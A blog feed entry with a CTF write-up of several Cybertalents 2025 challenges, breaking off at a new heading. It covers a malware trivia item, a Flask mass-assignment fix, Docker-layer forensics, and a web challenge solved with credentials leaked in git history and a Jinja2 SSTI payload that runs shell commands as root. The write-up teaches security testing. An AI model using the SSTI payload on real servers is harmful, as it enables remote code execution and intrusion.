<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://blog.looter.dev/feed.xml" rel="self" type="application/atom+xml" /><link href="https://blog.looter.dev/" rel="alternate" type="text/html" /><updated>2025-10-22T11:40:35-05:00</updated><id>https://blog.looter.dev/feed.xml</id><title type="html">m7eesn blog</title><subtitle>A personal blog with random posts.</subtitle><entry><title type="html">Cybertalents - New Year Challenge (2025)</title><link href="https://blog.looter.dev/ctf/challenges/2025/01/10/Cybertalents-New-Year-Challenge-2025.html" rel="alternate" type="text/html" title="Cybertalents - New Year Challenge (2025)" /><published>2025-01-10T06:00:00-06:00</published><updated>2025-01-10T06:00:00-06:00</updated><id>https://blog.looter.dev/ctf/challenges/2025/01/10/Cybertalents-New-Year-Challenge-2025</id><content type="html" xml:base="https://blog.looter.dev/ctf/challenges/2025/01/10/Cybertalents-New-Year-Challenge-2025.html"><![CDATA[<h1 id="new-year-challenge-2025--apple">New Year Challenge 2025 » Apple</h1>
<p>General Information / Basic / 25 (pts)</p>

<p>FLAG Format: just the name of the malware</p>

<p>Description:</p>

<p>A malware that plagues MacOS devices, and relies on Flash updates and social engineering tactics in order to dupe victims into installing the malware on devices.</p>

<hr />

<p>This challenge was an easy one few google searches and you find <a href="https://www.zdnet.com/article/this-simple-malware-still-plagues-one-in-10-mac-users/">This simple malware still plagues one in 10 Mac users</a>,</p>

<p>The flag is <code class="language-plaintext highlighter-rouge">Shlayer</code></p>

<hr />

<h1 id="new-year-challenge-2025--mmms">New Year Challenge 2025 » Mmms</h1>
<p>Secure Coding / Easy / 50 (pts)</p>

<p>Flag Format: Flag{}</p>

<p>Description:</p>

<p>We need fix this ASP for the students to get all the answers <code class="language-plaintext highlighter-rouge">challenge at /challenge/</code>.</p>

<h3 id="the-provided-rules">The provided rules</h3>

<ul>
  <li>Once all are fixed, you can find the flag at /flag maximum 10 Secs.</li>
  <li>Don’t break the application’s main functionalities or change the port.</li>
  <li>Secret leek don’t considered as vulnerability</li>
  <li>The edited application run on the / except /challenge/ and the flag route so you can interact with what you edit</li>
</ul>

<hr />

<p>The challenge provided the following source code for you to secure it,</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Blueprint</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">request</span>
<span class="kn">from</span> <span class="nn">app.utils</span> <span class="kn">import</span> <span class="n">session_validate</span>
<span class="kn">from</span> <span class="nn">app</span> <span class="kn">import</span> <span class="n">db</span>
<span class="kn">from</span> <span class="nn">models</span> <span class="kn">import</span> <span class="n">User</span><span class="p">,</span> <span class="n">Assignment</span>

<span class="n">api</span> <span class="o">=</span> <span class="n">Blueprint</span><span class="p">(</span><span class="s">"api"</span><span class="p">,</span> <span class="n">__name__</span><span class="p">)</span>


<span class="o">@</span><span class="n">api</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/assignment/validation"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"POST"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">assignments_validation</span><span class="p">():</span>
    <span class="n">user</span> <span class="o">=</span> <span class="n">session_validate</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
        <span class="nb">id</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"id"</span><span class="p">)</span>
        <span class="n">answer</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"answer"</span><span class="p">)</span>
        <span class="n">query</span> <span class="o">=</span> <span class="n">Assignment</span><span class="p">.</span><span class="n">query</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="nb">id</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">query</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">query</span><span class="p">.</span><span class="n">hidden</span><span class="p">:</span>
                <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"message"</span><span class="p">:</span> <span class="s">"Hidden assignment"</span><span class="p">})</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">query</span><span class="p">.</span><span class="n">answer</span> <span class="o">==</span> <span class="n">answer</span><span class="p">:</span>
                    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"message"</span><span class="p">:</span> <span class="s">"Correct answer"</span><span class="p">})</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"message"</span><span class="p">:</span> <span class="s">"Incorrect answer"</span><span class="p">})</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"message"</span><span class="p">:</span> <span class="s">"The assignment dont't exist"</span><span class="p">})</span>

    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"Message"</span><span class="p">:</span> <span class="s">"Please login"</span><span class="p">}),</span> <span class="mi">401</span>


<span class="o">@</span><span class="n">api</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/assignment/delete"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"POST"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">delete_assignment</span><span class="p">():</span>
    <span class="n">user</span> <span class="o">=</span> <span class="n">session_validate</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">user</span><span class="p">.</span><span class="n">role</span> <span class="o">==</span> <span class="s">"teacher"</span><span class="p">:</span>
            <span class="nb">id</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"id"</span><span class="p">)</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="n">assignment</span> <span class="o">=</span> <span class="n">Assignment</span><span class="p">.</span><span class="n">query</span><span class="p">.</span><span class="n">filter_by</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">).</span><span class="n">first</span><span class="p">()</span>
                <span class="k">if</span> <span class="n">assignment</span><span class="p">:</span>
                    <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">delete</span><span class="p">(</span><span class="n">assignment</span><span class="p">)</span>
                    <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">commit</span><span class="p">()</span>
                    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"delete"</span><span class="p">:</span> <span class="bp">True</span><span class="p">})</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"message"</span><span class="p">:</span> <span class="s">"The assignment dont't exist"</span><span class="p">})</span>
            <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>

                <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"delete"</span><span class="p">:</span> <span class="bp">False</span><span class="p">})</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"Message"</span><span class="p">:</span> <span class="s">"Only teacher can add assignments"</span><span class="p">}),</span> <span class="mi">401</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"Message"</span><span class="p">:</span> <span class="s">"Please login"</span><span class="p">}),</span> <span class="mi">401</span>


<span class="o">@</span><span class="n">api</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/assignment/update"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"POST"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">update_assignment</span><span class="p">():</span>
    <span class="n">user</span> <span class="o">=</span> <span class="n">session_validate</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">user</span><span class="p">.</span><span class="n">role</span> <span class="o">==</span> <span class="s">"teacher"</span><span class="p">:</span>
            <span class="nb">id</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"id"</span><span class="p">)</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="n">assignment</span> <span class="o">=</span> <span class="n">Assignment</span><span class="p">.</span><span class="n">query</span><span class="p">.</span><span class="n">filter_by</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">).</span><span class="n">first</span><span class="p">()</span>
                <span class="k">if</span> <span class="n">assignment</span><span class="p">:</span>
                    <span class="n">assignment</span><span class="p">.</span><span class="n">answer</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"answer"</span><span class="p">)</span>
                    <span class="n">assignment</span><span class="p">.</span><span class="n">title</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"title"</span><span class="p">)</span>
                    <span class="n">assignment</span><span class="p">.</span><span class="n">hidden</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"hidden"</span><span class="p">)</span>
                    <span class="n">assignment</span><span class="p">.</span><span class="n">description</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"description"</span><span class="p">)</span>
                    <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">commit</span><span class="p">()</span>
                    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"update"</span><span class="p">:</span> <span class="bp">True</span><span class="p">})</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"message"</span><span class="p">:</span> <span class="s">"The assignment dont't exist"</span><span class="p">})</span>
            <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
                <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"update"</span><span class="p">:</span> <span class="bp">False</span><span class="p">})</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"Message"</span><span class="p">:</span> <span class="s">"Only teacher can add assignments"</span><span class="p">}),</span> <span class="mi">401</span>

    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"Message"</span><span class="p">:</span> <span class="s">"Please login"</span><span class="p">}),</span> <span class="mi">401</span>


<span class="o">@</span><span class="n">api</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/assignment/create"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"POST"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">create_assignment</span><span class="p">():</span>
    <span class="n">user</span> <span class="o">=</span> <span class="n">session_validate</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">user</span><span class="p">.</span><span class="n">role</span> <span class="o">==</span> <span class="s">"teacher"</span><span class="p">:</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="n">assignment</span> <span class="o">=</span> <span class="n">Assignment</span><span class="p">(</span>
                    <span class="n">title</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"title"</span><span class="p">),</span>
                    <span class="n">description</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"description"</span><span class="p">),</span>
                    <span class="n">answer</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"answer"</span><span class="p">),</span>
                    <span class="n">hidden</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"hidden"</span><span class="p">),</span>
                    <span class="n">user_id</span><span class="o">=</span><span class="n">user</span><span class="p">.</span><span class="nb">id</span><span class="p">,</span>
                <span class="p">)</span>
                <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">assignment</span><span class="p">)</span>
                <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">commit</span><span class="p">()</span>
                <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"create"</span><span class="p">:</span> <span class="bp">True</span><span class="p">})</span>
            <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
                <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"create"</span><span class="p">:</span> <span class="bp">False</span><span class="p">})</span>

        <span class="k">else</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"Message"</span><span class="p">:</span> <span class="s">"Only teacher can add assignments"</span><span class="p">}),</span> <span class="mi">401</span>

    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"Message"</span><span class="p">:</span> <span class="s">"Please login"</span><span class="p">}),</span> <span class="mi">401</span>


<span class="o">@</span><span class="n">api</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/profile"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"GET"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">profile</span><span class="p">():</span>
    <span class="n">user</span> <span class="o">=</span> <span class="n">session_validate</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
        <span class="n">user</span> <span class="o">=</span> <span class="n">user</span><span class="p">.</span><span class="n">__dict__</span>
        <span class="n">elements_to_clean</span> <span class="o">=</span> <span class="p">[</span><span class="s">"_sa_instance_state"</span><span class="p">,</span> <span class="s">"password"</span><span class="p">]</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">elements_to_clean</span><span class="p">:</span>
            <span class="k">del</span> <span class="n">user</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">user</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"Message"</span><span class="p">:</span> <span class="s">"Please login"</span><span class="p">}),</span> <span class="mi">401</span>


<span class="o">@</span><span class="n">api</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/profile/update_name"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"POST"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">update_name</span><span class="p">():</span>
    <span class="n">user</span> <span class="o">=</span> <span class="n">session_validate</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">.</span><span class="n">items</span><span class="p">():</span>
            <span class="nb">setattr</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">commit</span><span class="p">()</span>
            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"update"</span><span class="p">:</span> <span class="bp">True</span><span class="p">})</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"update"</span><span class="p">:</span> <span class="bp">False</span><span class="p">})</span>

    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"Message"</span><span class="p">:</span> <span class="s">"Please login"</span><span class="p">}),</span> <span class="mi">401</span>
</code></pre></div></div>

<p>By quickly scanning the code, you notice <code class="language-plaintext highlighter-rouge">/profile/update_name</code> which accepts all user input and updates the user session, you can use this endpoint to update your own role to teacher thus leaking all the assignments to fix this venerability, you just need to validate that you are only updating <code class="language-plaintext highlighter-rouge">fname</code> and <code class="language-plaintext highlighter-rouge">lname</code>.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">@</span><span class="n">api</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/profile/update_name"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"POST"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">update_name</span><span class="p">():</span>
    <span class="n">user</span> <span class="o">=</span> <span class="n">session_validate</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">.</span><span class="n">items</span><span class="p">():</span>
            <span class="k">if</span> <span class="n">key</span> <span class="ow">in</span> <span class="p">[</span><span class="s">"fname"</span><span class="p">,</span> <span class="s">"lname"</span><span class="p">]:</span>
                <span class="nb">setattr</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">commit</span><span class="p">()</span>
            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"update"</span><span class="p">:</span> <span class="bp">True</span><span class="p">})</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"update"</span><span class="p">:</span> <span class="bp">False</span><span class="p">})</span>

    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"Message"</span><span class="p">:</span> <span class="s">"Please login"</span><span class="p">}),</span> <span class="mi">401</span>
</code></pre></div></div>

<p>Once you update the code, the flag become accessible at <code class="language-plaintext highlighter-rouge">/flag/</code>.</p>

<p>The flag is <code class="language-plaintext highlighter-rouge">Flag{QCFAYlVrZDZWczBaaDlzVEFYejhwQ2d3dE95UzFlSDVCaDN0ZFJwWHRvbStRbz1lN2Q5MGY3ZmMwNDM1YzU3}</code></p>

<hr />

<h1 id="year-challenge-2025--vrcon">Year Challenge 2025 » VRCon</h1>
<p>Digital Forensics / Easy / 50 (pts)</p>

<p>Flag Format: Flag{}</p>

<p>Description:</p>

<p>I was playing with containers and I left a message in someplace for you. can you find it? You are provided with <code class="language-plaintext highlighter-rouge">data.tar</code> file.</p>

<hr />

<p>When someone talks about containers, they most likely mean docker, thus you can do the following</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>docker load &lt; data.tar
</code></pre></div></div>

<p>Which will extract the container and you can then run it using</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>docker run <span class="nt">---rm</span> <span class="nt">-it</span> <span class="nt">--entrypoint</span> ash data:latest
</code></pre></div></div>

<p>Once you are inside the container, you find yourself in <code class="language-plaintext highlighter-rouge">/data</code> directory, and there is a rabbit hole file <code class="language-plaintext highlighter-rouge">mydata.txt</code>, however your target is <code class="language-plaintext highlighter-rouge">/root/data.txt</code>, i personally used a custom command to inspect the layers of the container and find the file</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>dfimage data:latest
FROM alpine:latest
ADD file:33ebe56b967747a97dcec01bc2559962bee8823686c9739d26be060381bbb3ca <span class="k">in</span> /
CMD <span class="o">[</span><span class="s2">"/bin/sh"</span><span class="o">]</span>
RUN RUN /bin/sh <span class="nt">-c</span> apk add <span class="nt">--no-cache</span> curl <span class="c"># buildkit</span>
RUN RUN /bin/sh <span class="nt">-c</span> <span class="nb">mkdir</span> /data <span class="c"># buildkit</span>
RUN RUN /bin/sh <span class="nt">-c</span> <span class="nb">echo</span> <span class="s2">"Just a random sentence."</span> <span class="o">&gt;&gt;</span> /data/mydata.txt <span class="c"># buildkit</span>
RUN RUN /bin/sh <span class="nt">-c</span> <span class="nb">echo</span> <span class="s2">"Another line with more words."</span> <span class="o">&gt;&gt;</span> /data/mydata.txt <span class="c"># buildkit</span>
<span class="c">#.... Many more layers of unimportant data...</span>
RUN RUN /bin/sh <span class="nt">-c</span> <span class="nv">Important</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-s</span> https://pastebin.com/raw/7Ch2T24f<span class="si">)</span> <span class="se">\</span>
    <span class="o">&amp;&amp;</span>     <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$Important</span><span class="s2">"</span> <span class="o">&gt;</span> /root/data.txt <span class="se">\</span>
    <span class="o">&amp;&amp;</span>     <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$Important</span><span class="s2">"</span> <span class="c"># buildkit</span>
RUN WORKDIR /data
RUN CMD <span class="o">[</span><span class="s2">"cat"</span> <span class="s2">"/data/mydata.txt"</span><span class="o">]</span>
</code></pre></div></div>

<p>reading the data in <code class="language-plaintext highlighter-rouge">/root/data.txt</code> you get the following string <code class="language-plaintext highlighter-rouge">3MtqnQWQvE2FnMcHjiH1JHKJminyCGD2GpBfaTCpPN5ss5pPSGt</code>, i tried to base64 decode it and that was a dead end, so i went <a href="https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,'')&amp;input=M010cW5RV1F2RTJGbk1jSGppSDFKSEtKbWlueUNHRDJHcEJmYVRDcFBONXNzNXBQU0d0">CyberChef</a> used the magic tool, and it was base58 encoded, decoding it you get the flag.</p>

<p>The flag is <code class="language-plaintext highlighter-rouge">Flag{1_C4n_G0_Thr0u9h_D0cK3R_L4Y3ERS}</code></p>

<hr />

<h1 id="new-year-challenge-2025--gym_hacker_1337">New Year Challenge 2025 » gym_hacker_1337</h1>
<p>Web Security / Easy / 50 (pts)</p>

<p>Flag Format: Flag{}</p>

<p>Description:</p>

<p>We are currently developing our app and share each stage of the process as an open-source project. Start the challenge now to see a demo!</p>

<hr />

<p>So you start the challenge, and spend unreasonable amount of time trying to attack the JWT token, trying to find SQL injection, but you don’t find any. You notice the app is flask and inspecting the source you see something <code class="language-plaintext highlighter-rouge">&lt;!-- Jinja2 Template for Dynamic Data --&gt;</code>, you suspect it’s probably SSTI, you try to inject  <code class="language-plaintext highlighter-rouge">{{7*7}}</code>  everywhere using BurpSuite, but nothing dam works.</p>

<p>Then, you take a break and then start over, from reading the challenge description, you notice <code class="language-plaintext highlighter-rouge">open-source project</code> phrase, so you take the challenge name to google, you find nothing. You then try to search for <code class="language-plaintext highlighter-rouge">gym_hacker_1337</code> in GitHub, and you find the <a href="https://github.com/ddd-jjaaiw/gym_hacker_1337">ddd-jjaaiw/gym_hacker_1337</a>, which looks like the current app.</p>

<p>Checking the <code class="language-plaintext highlighter-rouge">app.py</code> source you notice</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">with</span> <span class="n">app</span><span class="p">.</span><span class="n">app_context</span><span class="p">():</span>
    <span class="n">db</span><span class="p">.</span><span class="n">create_all</span><span class="p">()</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">User</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s">"admin"</span><span class="p">,</span>
                        <span class="n">email</span><span class="o">=</span><span class="s">"mail@mail.com"</span><span class="p">,</span>
                        <span class="n">password</span><span class="o">=</span><span class="n">bcrypt</span><span class="p">.</span><span class="n">generate_password_hash</span><span class="p">(</span><span class="s">"admin_password_here"</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">),</span> <span class="n">secret</span><span class="o">=</span><span class="n">uuid</span><span class="p">.</span><span class="n">uuid4</span><span class="p">().</span><span class="nb">hex</span><span class="p">,</span><span class="n">is_admin</span><span class="o">=</span><span class="bp">True</span><span class="p">))</span>
        <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">commit</span><span class="p">()</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</code></pre></div></div>

<p>Trying the given password for admin, it doesn’t work. You notice there is 3 commits for the repo, running blame on <code class="language-plaintext highlighter-rouge">app.py</code> you notice the following</p>

<div class="language-patch highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gh">diff --git a/app.py b/app.py
index 41b211f..12936fd 100644
</span><span class="gd">--- a/app.py
</span><span class="gi">+++ b/app.py
</span><span class="p">@@ -105,8 +105,8 @@</span> def admin():
     db.create_all()
     try:
         db.session.add(User(name="admin",
<span class="gd">-                        email="admin@gymcode.com",
-                        password=bcrypt.generate_password_hash("wLrv0Zf35DxF7Tq9z3oieVZBXOknR1rV").decode('utf-8'), secret=uuid.uuid4().hex,is_admin=True))
</span><span class="gi">+                        email="mail@mail.com",
+                        password=bcrypt.generate_password_hash("admin_password_here").decode('utf-8'), secret=uuid.uuid4().hex,is_admin=True))
</span>         db.session.commit()
     except Exception as e:
<span class="gd">-        print(e)
</span><span class="err">\</span> No newline at end of file
<span class="gi">+        print(e)
</span></code></pre></div></div>

<p>So the credentials are <code class="language-plaintext highlighter-rouge">admin@gymcode.com:wLrv0Zf35DxF7Tq9z3oieVZBXOknR1rV</code>. Checking the rest of the app you notice the SSTI injection point in <code class="language-plaintext highlighter-rouge">app.py</code></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/admin"</span><span class="p">,</span>  <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">admin</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">session</span> <span class="ow">and</span> <span class="n">session</span><span class="p">[</span><span class="s">"email"</span><span class="p">]</span> <span class="ow">and</span> <span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"is_admin"</span><span class="p">)</span> <span class="p">:</span>
        <span class="n">debug</span><span class="o">=</span><span class="s">""</span>
        <span class="k">print</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'depuuugggAdmIn_get'</span><span class="p">)</span> <span class="p">)</span>
        <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'depuuugggAdmIn_get'</span><span class="p">)</span> <span class="p">:</span>
            <span class="n">debug</span><span class="o">=</span><span class="n">Template</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'depuuugggAdmIn_get'</span><span class="p">)).</span><span class="n">render</span><span class="p">()</span>
            
        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"admin.j2"</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="n">session</span><span class="p">[</span><span class="s">"name"</span><span class="p">],</span><span class="n">users</span><span class="o">=</span><span class="n">User</span><span class="p">.</span><span class="n">query</span><span class="p">.</span><span class="nb">all</span><span class="p">(),</span><span class="n">debug</span><span class="o">=</span><span class="n">debug</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s">"login"</span><span class="p">))</span>
</code></pre></div></div>

<p>So, it’s simply matter of getting SSTI for jinja2, using generic payload like <code class="language-plaintext highlighter-rouge">{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}</code> you are able to see that it is being executed <code class="language-plaintext highlighter-rouge">uid=0(root) gid=0(root) groups=0(root)</code>, from there you can do whatever you want. The commands i used to read the flag are</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls /
cat /*flag.txt
</code></pre></div></div>
<p>The flag is <code class="language-plaintext highlighter-rouge">Flag{QCFAb0tYdUR5ZVV5b3FMZE92NEJDd3RBSC9wZWNtRWtDMmRiRDZqNUhpUHBXTT0xYjM2MmUyM2U0ZTZiODBh}</code></p>

<hr />

<h1 id="new-year-challenge-2025--shanks">New Year Challenge 2025 » Shanks</h1>
